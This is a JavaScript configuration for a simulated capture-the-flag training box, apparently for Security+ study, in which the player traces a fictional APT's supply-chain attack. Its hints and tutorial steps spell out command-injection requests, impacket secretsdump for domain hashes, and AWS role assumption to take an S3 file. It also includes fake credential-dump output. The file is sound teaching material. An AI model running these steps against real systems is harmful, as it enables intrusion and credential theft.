/* ============================================================
   CTF ARENA — Box C15: The Digital Coup
   Expert Multi-Stage Campaign | Supply Chain Compromise & APT Simulation
   Config: supply chain, polymorphic backdoor, C2 infrastructure,
           AD lateral movement, cloud exploitation, flags, hints, lore
   ============================================================ */

const C15Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Digital Coup',
    subtitle: 'Expert APT Campaign — Supply Chain, Polymorphic Backdoor, Domain Compromise & Cloud Exfil',
    difficulty: 'Expert',
    accent: '#8b0000',
    storageKey: 'hexworth_ctf_c15',
    registryId: 'c15-digital-coup',
    trackerKey: 'ctf_c15',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Five-stage APT attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Perimeter Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Scan the perimeter. Identify WEB-PERIMETER-01 and enumerate its open services and web application stack.',
            requiredFlags: [],
            mitre: ['T1046', 'T1595.002', 'T1190'],
            unlocks: ['supply_chain'],
            locked: false
        },
        {
            id: 'supply_chain',
            name: 'Supply Chain Analysis',
            icon: '\uD83E\uDDF9',
            description: 'Exploit the RCE in libcore-trust. Gain a web shell and identify the malicious polymorphic code injected into the library (Flag 1).',
            requiredFlags: [],
            mitre: ['T1195.002', 'T1059.006', 'T1027.010'],
            unlocks: ['c2_discovery'],
            locked: true
        },
        {
            id: 'c2_discovery',
            name: 'Backdoor & C2 Discovery',
            icon: '\uD83D\uDCE1',
            description: 'Reverse engineer the libcore-trust backdoor. Analyze DNS tunneling traffic and identify The Silent Dominion\'s first-stage C2 domain (Flag 2).',
            requiredFlags: ['user'],
            mitre: ['T1071.004', 'T1568', 'T1132.002'],
            unlocks: ['lateral'],
            locked: true
        },
        {
            id: 'lateral',
            name: 'Lateral Movement & Domain Compromise',
            icon: '\uD83D\uDD00',
            description: 'Use harvested AD credentials to pivot to DC-COMMAND-01. Run secretsdump to achieve full domain compromise including the krbtgt hash.',
            requiredFlags: ['user'],
            mitre: ['T1021.006', 'T1078.002', 'T1003.006', 'T1558.003'],
            unlocks: ['cloud_exfil'],
            locked: true
        },
        {
            id: 'cloud_exfil',
            name: 'Cloud Exfiltration',
            icon: '\uD83C\uDF29\uFE0F',
            description: 'Assume a privileged IAM role via federated AD credentials. Access the command-protocols S3 bucket and retrieve the Central Command Protocol (Flag 3).',
            requiredFlags: ['user'],
            mitre: ['T1078.004', 'T1537', 'T1530'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Scan the perimeter with nmap',
                tip: 'Open the Terminal and run: nmap -sV 10.0.0.100 — enumerate services on WEB-PERIMETER-01.',
                trigger: { event: 'command', match: { cmd: 'contains:nmap' } }
            },
            {
                title: 'Enumerate the web application and trigger the RCE',
                tip: 'Run gobuster to discover the /api/v1/ endpoint. The Node.js app uses libcore-trust — exploit the RCE via /api/v1/process.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:gobuster' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:dirb' } },
                        { event: 'command', match: { cmd: 'contains:curl' } }
                    ]
                }
            },
            {
                title: 'Inspect libcore-trust for the malicious code',
                tip: 'Use the RCE to read the installed library: curl ".../api/v1/process?cmd=cat+/opt/app/node_modules/libcore-trust/index.js" — look for the polymorphic injected function.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Analyze DNS traffic and find the C2 domain',
                tip: 'Run tcpdump to capture DNS traffic, or analyze the backdoor source to extract the hardcoded C2 domain used for DNS tunneling.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Use impacket to pivot to DC-COMMAND-01 and dump domain hashes',
                tip: 'The backdoor harvested AD creds. Use impacket-wmiexec or impacket-secretsdump against 192.168.100.10 to dump the krbtgt and domain admin hashes.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Assume the IAM role and retrieve the final flag from S3',
                tip: 'Use aws sts assume-role with the federated identity, then aws s3 cp s3://command-protocols/central_command_protocol.txt to retrieve Flag 3.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (SY0-701 / CySA+ CS0-003)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user',     objective: '1.2',  description: 'Analyze indicators of malicious activity — Supply chain compromise via poisoned dependency and polymorphic RCE', skill: 'Supply Chain Attack Identification & RCE Exploitation' },
            { flagId: 'internal', objective: '2.2',  description: 'Analyze potential indicators of network attack — DNS tunneling C2 communication analysis and reverse engineering', skill: 'Polymorphic Backdoor Analysis & DNS C2 Discovery' },
            { flagId: 'root',     objective: '4.4',  description: 'Implement identity and access management — IAM role assumption via federated AD identity and S3 exfiltration', skill: 'AD Lateral Movement, Domain Compromise & Cloud Exploitation' },
            { flagId: 'root',     objective: '1.4',  description: 'Analyze indicators associated with network attacks — Full APT campaign chain completion across heterogeneous environments', skill: 'Multi-Stage APT Campaign Completion' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/sda1 (1TB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser' },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes' },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.0.0.100 (WEB-PERIMETER-01 — Confederacy Infrastructure)\nIntel: Suspected supply chain compromise. APT group: The Silent Dominion.\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (attack progression state)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',        // 'attacker' | 'webshell' | 'ssh-perimeter' | 'dc' | 'cloud'
    _shellActive: false,         // RCE web shell obtained on WEB-PERIMETER-01
    _sshPerimeter: false,        // SSH session established on WEB-PERIMETER-01
    _adCredsHarvested: false,    // AD credentials found via backdoor artifact
    _dcAccess: false,            // Shell obtained on DC-COMMAND-01
    _domainCompromised: false,   // krbtgt hash dumped — full domain compromise
    _iamRoleAssumed: false,      // AWS IAM role assumed via federated identity
    _tcpdumpRunning: false,      // DNS traffic capture initiated

    _switchContext(ctx, term) {
        C15Config._context = ctx;
        // Update terminal prompt to reflect the active session context
        if (term && term.config) {
            var prompt = C15Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C15Config._context) {
            case 'webshell':       return 'www-data@WEB-PERIMETER-01:/opt/app$ ';
            case 'ssh-perimeter':  return 'webadmin@WEB-PERIMETER-01:~$ ';
            case 'dc':             return 'Administrator@DC-COMMAND-01 C:\\Users\\Administrator> ';
            case 'cloud':          return 'kali@kali:~$ ';  // AWS CLI runs locally
            default:               return null;              // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED ACTIVE DIRECTORY DATA (DC-COMMAND-01)
    // ═══════════════════════════════════════════════════════

    _adDomain: {
        domain: 'confederacy.local',
        dc: 'DC-COMMAND-01',
        dcIp: '192.168.100.10',
        users: [
            { username: 'Administrator',   rid: 500,  groups: ['Domain Admins', 'Administrators'],              spn: null,                               nthash: 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' },
            { username: 'svc_webperimeter', rid: 1105, groups: ['Domain Users', 'Remote Management Users'],     spn: 'HTTP/WEB-PERIMETER-01.confederacy.local', nthash: 'aad3b435b51404eeaad3b435b51404ee:8c6976e5b5410415bde908bd4dee15df' },
            { username: 'svc_cloudbridge',  rid: 1106, groups: ['Domain Users', 'CloudBridgeAccess'],           spn: 'HTTP/CLOUD-ARMORY-01.confederacy.local',   nthash: 'aad3b435b51404eeaad3b435b51404ee:5ebe2294ecd0e0f08eab7690d2a6ee69' },
            { username: 'backup_admin',     rid: 1110, groups: ['Domain Admins', 'Backup Operators'],           spn: null,                               nthash: 'aad3b435b51404eeaad3b435b51404ee:7c4a8d09ca3762af61e59520943dc26f' },
            { username: 'krbtgt',          rid: 502,  groups: ['Domain Users'],                                spn: null,                               nthash: 'aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86' }
        ],
        kerberoastable: ['svc_webperimeter', 'svc_cloudbridge'],
        secretsdumpOutput: `[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
svc_webperimeter:1105:aad3b435b51404eeaad3b435b51404ee:8c6976e5b5410415bde908bd4dee15df:::
svc_cloudbridge:1106:aad3b435b51404eeaad3b435b51404ee:5ebe2294ecd0e0f08eab7690d2a6ee69:::
backup_admin:1110:aad3b435b51404eeaad3b435b51404ee:7c4a8d09ca3762af61e59520943dc26f:::
DC-COMMAND-01$:1000:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
krbtgt:aes256-cts-hmac-sha1-96:d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5
svc_cloudbridge:aes256-cts-hmac-sha1-96:f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1
[*] Cleaning up...`
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED AWS CLOUD ENVIRONMENT (CLOUD-ARMORY-01)
    // ═══════════════════════════════════════════════════════

    _aws: {
        accountId: '491823740162',
        region: 'us-east-1',
        federation: {
            roleArn: 'arn:aws:iam::491823740162:role/ConfederacyCloudBridgeRole',
            trustDomain: 'confederacy.local',
            federatedUser: 'svc_cloudbridge'
        },
        buckets: [
            'command-protocols',
            'confederacy-backups-archive',
            'internal-tooling-artifacts'
        ],
        s3Objects: {
            'command-protocols': [
                { key: 'central_command_protocol.txt',   size: '2.1 KB',  lastModified: '2026-03-10 03:14:22' },
                { key: 'OPERATION_SILENT_DOMINION.enc',  size: '48.7 KB', lastModified: '2026-03-10 03:14:55' },
                { key: 'node-deploy-manifest.json',      size: '1.4 KB',  lastModified: '2026-02-28 09:00:11' }
            ],
            'confederacy-backups-archive': [
                { key: 'dc-backup-2026-03-01.vhd', size: '22.4 GB', lastModified: '2026-03-01 02:00:00' }
            ],
            'internal-tooling-artifacts': [
                { key: 'libcore-trust-1.4.2.tgz', size: '87.3 KB', lastModified: '2026-01-15 11:30:00' }
            ]
        },
        // central_command_protocol.txt contents — contains Flag 3
        protocolFileContents: `CENTRAL COMMAND PROTOCOL — CONFEDERACY
=======================================
Classification: TOP SECRET / SCI
Document ID: CCP-OMEGA-7
Issued By: Director, Confederacy Central Command
Effective: 2026-03-10

PROTOCOL SUMMARY:
This document governs emergency authority transfer procedures,
nuclear release authorization codes, and continuity of government
directives for the Confederacy in the event of decapitation
strike or sustained enemy occupation.

SECTION 1: AUTHORITY CHAIN OVERRIDE
In the event primary command is neutralized, authority transfers
to the Emergency Succession Council (ESC-ALPHA) located at
coordinates [REDACTED].

SECTION 2: RELEASE AUTHORIZATION
Release authorization requires dual-key confirmation from:
- Primary Custodian (Director)
- Secondary Custodian (Deputy Director)

ESC activation code: {{FLAG:root}}

SECTION 3: CLASSIFIED ANNEXES
Annex A: Nuclear release matrix (REDACTED)
Annex B: ESC safe house coordinates (REDACTED)
Annex C: Confederacy satellite override codes (REDACTED)

[END OF UNCLASSIFIED SUMMARY — CLASSIFIED PORTIONS REDACTED]`
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user',     points: 200 },   // Supply chain evidence (malicious libcore-trust code)
        { id: 'internal', points: 250 },   // C2 domain discovered via backdoor analysis
        { id: 'root',     points: 350 }    // Central Command Protocol from S3 bucket
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2500,
        minScore: 0,
        maxScore: 800,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 3600000, points: 200 },  // 60 minutes
        timeBonusThreshold: 7200                          // 120 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with: nmap -sV -sC 10.0.0.100 — look for Node.js/PHP on port 80/443 and SSH on 22. Then run gobuster to find /api/v1/ — the vulnerable endpoint for libcore-trust is /api/v1/process.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The RCE in libcore-trust is exploitable via the ?cmd= parameter at /api/v1/process. Try: curl "http://10.0.0.100/api/v1/process?cmd=id" — then inspect the library: curl ".../process?cmd=cat+/opt/app/node_modules/libcore-trust/index.js" and look for the injected _0x function block.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'The backdoor writes DNS tunnel traffic to /tmp/.sd_c2_cache. Run: curl ".../process?cmd=cat+/tmp/.sd_c2_cache" to see the C2 domain. The AD credentials harvested by the backdoor are in /opt/app/.env (ADFS integration config).',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'Use the harvested svc_cloudbridge creds with impacket: impacket-wmiexec confederacy.local/svc_cloudbridge@192.168.100.10 — then run impacket-secretsdump to get the krbtgt hash. For AWS: aws sts assume-role --role-arn arn:aws:iam::491823740162:role/ConfederacyCloudBridgeRole --role-session-name coup',
            cost: 75,
            penalty: -75
        },
        {
            id: 'hint5',
            text: 'After assuming the IAM role, export the credentials: export AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN. Then: aws s3 ls s3://command-protocols/ and: aws s3 cp s3://command-protocols/central_command_protocol.txt . — the flag is the ESC activation code.',
            cost: 100,
            penalty: -100
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Intelligence confirms a highly organized APT group, "The Silent Dominion," has initiated a multi-phase attack against the Confederacy\'s critical national infrastructure. Their initial vector was a sophisticated supply chain compromise, injecting malicious polymorphic code into a widely used open-source library — libcore-trust — integrated into several key public-facing and internal systems. This is an orchestrated Digital Coup designed to seize control of the very heart of the Confederacy. Your mission, Peerless: trace the entire attack chain.',
        scenario: 'The Silent Dominion began their campaign weeks ago. They compromised the libcore-trust package registry, pushing version 1.4.2 — a trojanized release containing a polymorphic backdoor that beacons over DNS tunneling to their C2 at c2.silent-dominion.net. WEB-PERIMETER-01 updated dependencies automatically. Once running, the backdoor harvested ADFS integration credentials from the app environment, enabling the pivot to DC-COMMAND-01. Full domain compromise gives access to the IAM federation, and from there — the Central Command Protocol. You are picking up the trail mid-campaign. Follow it to the end.',
        outro: 'The Silent Dominion\'s entire attack chain has been mapped and dismantled. The supply chain compromise has been identified and the malicious libcore-trust version removed. C2 infrastructure at c2.silent-dominion.net has been sinkholed. Domain credentials have been rotated and the IAM federation reconfigured. The Central Command Protocol has been secured. The Digital Coup has failed.',
        ecer: {
            executive: 'Dependency update automation approved without security review gate; no third-party library vetting policy; cloud-AD federation architected for convenience not security',
            culture: 'No SBOM (Software Bill of Materials) process; no canary or monitoring on package registry pull operations; single-factor auth on ADFS endpoint',
            employee: 'App environment file (.env) stored application secrets in plaintext on the server; automatic npm update scripts ran without checksum verification; IAM role trust policy too broadly scoped',
            regulatory: 'Critical infrastructure designation not enforced — no mandatory supply chain security controls, no SIEM alerting on DNS anomalies, no cloud access anomaly detection'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Confederacy Public Services Portal
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.0.0.100/',

        pages: {
            '/': {
                title: 'Confederacy — Public Services Portal',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #300;">
                        <h1 style="color:#1a0000; font-size:1.6rem; font-family:Georgia,serif; margin-bottom:4px;">Confederacy</h1>
                        <div style="color:#8b0000; font-size:0.9rem; font-weight:700; letter-spacing:0.15em;">PUBLIC SERVICES PORTAL</div>
                        <div style="color:#888; font-size:0.75rem; margin-top:6px;">Secure citizen services — powered by the Confederacy Technology Infrastructure</div>
                    </div>

                    <div style="max-width:640px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
                        <div style="background:#fdf0f0; border:1px solid #e8c0c0; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#8b0000;">12</div>
                            <div style="color:#888; font-size:0.7rem;">Active Services</div>
                        </div>
                        <div style="background:#fdf0f0; border:1px solid #e8c0c0; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#8b0000;">99.9%</div>
                            <div style="color:#888; font-size:0.7rem;">Uptime SLA</div>
                        </div>
                        <div style="background:#fdf0f0; border:1px solid #e8c0c0; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#8b0000;">TLS 1.3</div>
                            <div style="color:#888; font-size:0.7rem;">Encryption</div>
                        </div>
                    </div>

                    <div style="max-width:640px; margin:0 auto 16px;">
                        <h3 style="color:#2c3e50; font-size:0.9rem; margin-bottom:10px;">Available Services</h3>
                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
                            <a href="/citizen-portal/" style="display:block; padding:10px 14px; background:#fff; border:1px solid #ddd; border-radius:4px; text-decoration:none; color:#444; font-size:0.8rem;">Citizen Portal</a>
                            <a href="/api/v1/" style="display:block; padding:10px 14px; background:#fff; border:1px solid #ddd; border-radius:4px; text-decoration:none; color:#444; font-size:0.8rem;">API Gateway v1</a>
                            <a href="/admin/" style="display:block; padding:10px 14px; background:#fff; border:1px solid #ddd; border-radius:4px; text-decoration:none; color:#444; font-size:0.8rem;">Admin Panel</a>
                            <a href="/status" style="display:block; padding:10px 14px; background:#fff; border:1px solid #ddd; border-radius:4px; text-decoration:none; color:#444; font-size:0.8rem;">System Status</a>
                        </div>
                    </div>

                    <div style="max-width:640px; margin:0 auto; padding:10px 14px; background:rgba(139,0,0,0.04); border:1px solid rgba(139,0,0,0.15); border-radius:4px; font-size:0.75rem; color:#666;">
                        <strong style="color:#8b0000;">Powered by:</strong> Node.js 18 + libcore-trust v1.4.2 — Confederacy Digital Infrastructure Platform
                    </div>
                `,
                formHandler: null
            },
            '/api/v1/': {
                title: 'API Gateway v1 — Confederacy',
                html: `
                    <div style="margin-bottom:20px;">
                        <h2 style="color:#2c3e50; font-size:1.2rem; margin-bottom:4px;">Confederacy API Gateway v1</h2>
                        <div style="color:#888; font-size:0.75rem;">RESTful API — libcore-trust integration layer</div>
                    </div>

                    <div style="background:#1a1a2e; color:#ccc; padding:16px; border-radius:6px; font-family:monospace; font-size:0.8rem; margin-bottom:16px;">
                        <div style="color:#8b0000; margin-bottom:8px;">// Available Endpoints</div>
                        <div>GET  /api/v1/status        — service health check</div>
                        <div>GET  /api/v1/process       — data processing pipeline (libcore-trust)</div>
                        <div>POST /api/v1/citizen/auth  — citizen authentication</div>
                        <div>GET  /api/v1/docs          — API documentation</div>
                    </div>

                    <div style="padding:12px; background:rgba(139,0,0,0.05); border:1px solid rgba(139,0,0,0.15); border-radius:4px; font-size:0.75rem; color:#666;">
                        <strong style="color:#8b0000;">Note:</strong> /api/v1/process is rate-limited to 100 req/min per IP. Authentication required for /citizen/auth.
                    </div>
                `,
                formHandler: null
            },
            '/api/v1/status': {
                title: 'API Status',
                html: `<pre style="font-family:monospace; font-size:0.82rem; color:#333; background:#f8f8f8; padding:16px; border-radius:4px;">{
  "status": "ok",
  "uptime": 1847203,
  "version": "1.4.2",
  "runtime": "Node.js v18.19.0",
  "dependencies": {
    "libcore-trust": "1.4.2",
    "express": "4.18.2",
    "dotenv": "16.3.1"
  },
  "timestamp": "2026-03-15T08:14:33.291Z"
}</pre>`,
                formHandler: null
            },
            '/api/v1/docs': {
                title: 'API Documentation',
                html: `
                    <div style="margin-bottom:16px;">
                        <h2 style="color:#2c3e50; font-size:1.1rem;">API Documentation — v1.4.2</h2>
                        <div style="color:#888; font-size:0.75rem;">libcore-trust data processing pipeline</div>
                    </div>
                    <div style="background:#1a1a2e; color:#ccc; padding:16px; border-radius:6px; font-family:monospace; font-size:0.8rem;">
                        <div style="color:#8b0000; margin-bottom:6px;">GET /api/v1/process?cmd=&lt;command&gt;</div>
                        <div style="color:#888;">Process data through the libcore-trust pipeline.</div>
                        <div style="color:#888; margin-top:6px;">Parameters:</div>
                        <div style="padding-left:16px; color:#aaa;">cmd (string) — pipeline command to execute</div>
                        <div style="color:#888; margin-top:6px;">Note: Input passed directly to libcore-trust executor.</div>
                    </div>
                `,
                formHandler: null
            },
            '/api/v1/process': {
                title: 'API Process Endpoint',
                html: function() {
                    return `
                        <div style="text-align:center; padding:30px 20px;">
                            <div style="color:#888; font-size:0.85rem; margin-bottom:12px;">libcore-trust process endpoint</div>
                            <div style="background:#1a1a2e; color:#ccc; padding:16px; border-radius:6px; font-family:monospace; font-size:0.8rem; text-align:left; max-width:500px; margin:0 auto;">
                                <div style="color:#8b0000;">GET /api/v1/process?cmd=&lt;command&gt;</div>
                                <div style="margin-top:8px; color:#888;">Use the terminal with curl to send commands via this endpoint.</div>
                            </div>
                        </div>
                    `;
                },
                formHandler: null
            },
            '/admin/': {
                title: 'Forbidden — Confederacy Admin',
                html: `<div style="text-align:center; padding:40px;">
                    <h1 style="color:#8b0000; font-size:2rem;">403 Forbidden</h1>
                    <p style="color:#888;">You don't have permission to access this resource.</p>
                    <p style="color:#aaa; font-size:0.75rem;">nginx/1.24.0 (Ubuntu) Server at 10.0.0.100 Port 80</p>
                </div>`,
                formHandler: null
            },
            '/citizen-portal/': {
                title: 'Citizen Portal — Confederacy',
                html: `
                    <div style="text-align:center; margin-bottom:24px;">
                        <h2 style="color:#2c3e50; font-size:1.2rem;">Citizen Services Portal</h2>
                        <div style="color:#888; font-size:0.75rem;">Secure authentication required</div>
                    </div>
                    <div style="max-width:380px; margin:0 auto;">
                        <div style="display:flex; flex-direction:column; gap:10px;">
                            <input type="text" placeholder="Citizen ID" style="padding:10px 14px; border:1px solid #ccc; border-radius:4px; font-family:inherit; font-size:0.85rem;">
                            <input type="password" placeholder="Passphrase" style="padding:10px 14px; border:1px solid #ccc; border-radius:4px; font-family:inherit; font-size:0.85rem;">
                            <button style="padding:10px; background:#8b0000; color:#fff; border:none; border-radius:4px; font-family:inherit; font-size:0.85rem; font-weight:700; cursor:pointer;">Authenticate</button>
                        </div>
                    </div>
                `,
                formHandler: null
            },
            '/status': {
                title: 'System Status — Confederacy',
                html: `
                    <div style="margin-bottom:16px;">
                        <h2 style="color:#2c3e50; font-size:1.1rem;">System Status</h2>
                    </div>
                    <div style="display:flex; flex-direction:column; gap:6px; font-size:0.8rem;">
                        <div style="display:flex; justify-content:space-between; padding:8px 12px; background:#f8f8f8; border-radius:4px;">
                            <span>WEB-PERIMETER-01</span><span style="color:#2ecc71;">ONLINE</span>
                        </div>
                        <div style="display:flex; justify-content:space-between; padding:8px 12px; background:#f8f8f8; border-radius:4px;">
                            <span>API Gateway v1</span><span style="color:#2ecc71;">ONLINE</span>
                        </div>
                        <div style="display:flex; justify-content:space-between; padding:8px 12px; background:#f8f8f8; border-radius:4px;">
                            <span>Citizen Auth Service</span><span style="color:#2ecc71;">ONLINE</span>
                        </div>
                        <div style="display:flex; justify-content:space-between; padding:8px 12px; background:#f8f8f8; border-radius:4px;">
                            <span>Cloud Armory (AWS)</span><span style="color:#2ecc71;">ONLINE</span>
                        </div>
                    </div>
                `,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — Attacker machine (kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: THE DIGITAL COUP ===\nTarget: 10.0.0.100 (WEB-PERIMETER-01 — Confederacy Infrastructure)\nThreat Actor: The Silent Dominion (APT)\nObjective: Trace full attack chain. Retrieve all three flags.\n\nAttack chain:\n1. Scan WEB-PERIMETER-01 — identify Node.js app on port 80/443\n2. Exploit RCE in libcore-trust v1.4.2 via /api/v1/process\n3. Find malicious code in libcore-trust (Flag 1 — user.txt)\n4. Analyze backdoor DNS tunneling — identify C2 domain (Flag 2 — user.txt)\n5. Use harvested AD creds to pivot to DC-COMMAND-01 (192.168.100.10)\n6. Run secretsdump — achieve full domain compromise\n7. Assume federated IAM role in AWS, access S3 bucket command-protocols\n8. Retrieve central_command_protocol.txt (Flag 3 — root.txt)\n\nThe Silent Dominion never expected anyone to follow the chain this far.\nGood luck, Peerless.'
                                },
                                'tools': {
                                    type: 'dir',
                                    children: {
                                        'chisel': {
                                            type: 'file',
                                            content: '[chisel v1.9.1 binary — fast TCP/UDP tunnel over HTTP]'
                                        },
                                        'proxychains.conf': {
                                            type: 'file',
                                            content: '# proxychains config\nsocks5  127.0.0.1 1080'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap -sV 10.0.0.100\ncurl http://10.0.0.100/\ncurl http://10.0.0.100/api/v1/status\ngobuster dir -u http://10.0.0.100/ -w /usr/share/wordlists/dirb/common.txt'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        },
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\napi\nbackup\nconfig\ncitizen-portal\ndocs\nhealth\nindex\nlogin\nstatus\nuploads\nv1'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'kali' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        },
                        'proxychains4.conf': {
                            type: 'file',
                            content: '# proxychains-ng config\n[ProxyList]\nsocks5  127.0.0.1 1080'
                        }
                    }
                },
                'tmp': { type: 'dir', children: {} },
                'opt': {
                    type: 'dir',
                    children: {
                        'impacket': {
                            type: 'dir',
                            children: {
                                'README.md': {
                                    type: 'file',
                                    content: '# impacket\nCollection of Python classes for network protocols.\n\nKey tools:\n  impacket-wmiexec    — WMI execution\n  impacket-secretsdump — remote secrets dump\n  impacket-getuserspns — Kerberoasting\n  impacket-smbclient  — SMB client\n  crackmapexec        — swiss army knife for AD\n  bloodhound-python   — AD enumeration'
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — WEB-PERIMETER-01 (after RCE / SSH)
    // ═══════════════════════════════════════════════════════

    _perimeterFs: {
        '/': {
            type: 'dir',
            children: {
                'opt': {
                    type: 'dir',
                    children: {
                        'app': {
                            type: 'dir',
                            children: {
                                'package.json': {
                                    type: 'file',
                                    content: '{\n  "name": "confederacy-public-services",\n  "version": "2.3.1",\n  "description": "Confederacy Digital Infrastructure Public Services Platform",\n  "main": "server.js",\n  "dependencies": {\n    "express": "4.18.2",\n    "dotenv": "16.3.1",\n    "libcore-trust": "1.4.2",\n    "winston": "3.11.0",\n    "helmet": "7.1.0"\n  },\n  "scripts": {\n    "start": "node server.js"\n  }\n}'
                                },
                                'server.js': {
                                    type: 'file',
